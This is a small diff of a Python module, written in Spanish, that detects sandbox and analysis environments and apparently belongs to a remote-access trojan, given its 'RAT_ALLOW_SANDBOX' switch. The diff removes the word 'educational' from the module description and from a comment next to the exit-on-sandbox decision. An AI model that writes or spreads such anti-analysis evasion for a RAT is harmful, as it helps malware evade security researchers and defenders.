@@ -1,6 +1,6 @@
 """
 Módulo de verificación de entorno - Detección de sandbox/análisis
-Propósito educativo: Entender técnicas de evasión usadas por malware real
+Propósito: Entender técnicas de evasión usadas por malware real
 """
 
 import os
@@ -196,7 +196,7 @@ class EnvironmentChecker:
         """
         Decide si debe salir basado en los checks
         """
-        # En entorno educativo, podemos configurar comportamiento
+        # Configurable mediante variable de entorno
         return self.is_sandbox and os.getenv('RAT_ALLOW_SANDBOX') != '1'
 
 
